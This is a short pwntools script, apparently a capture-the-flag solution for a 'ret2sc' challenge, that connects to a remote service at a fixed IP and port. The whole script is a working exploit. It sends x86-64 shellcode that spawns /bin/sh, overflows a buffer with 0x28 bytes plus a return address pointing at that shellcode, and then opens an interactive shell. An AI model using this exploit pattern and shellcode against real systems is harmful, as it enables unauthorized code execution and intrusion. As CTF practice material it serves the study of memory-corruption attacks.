from pwn import *
#r = process("./ret2sc")
r = remote("120.114.62.211",2122)
shellcode= b"\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05"

print(shellcode)

r.recvuntil(b":")
r.send(shellcode)
addr = 0x601080
r.recvuntil(b":")
r.sendline(b"a"*0x28 + p64(addr))
r.interactive()
